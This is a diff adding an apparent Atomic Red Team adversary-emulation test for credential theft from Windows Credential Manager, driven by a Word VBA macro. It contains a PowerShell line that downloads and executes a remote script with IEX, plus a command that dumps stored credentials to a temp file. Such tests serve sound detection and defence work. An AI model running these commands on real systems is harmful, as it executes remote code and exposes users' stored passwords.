@@ -1,0 +1,17 @@
+#TechniqueName: Credentials from Password Stores
+#AtomicTestName: Extract Windows Credential Manager via VBA
+#Description: This module will extract the credentials found within the Windows credential manager and dump&them to $env:TEMP\windows-credentials.txt&
+#Language: ps1
+
+#get_prereq_commands
+Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+
+
+#commands
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
+
+
+#cleanup_commands
+Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction Ignore
+
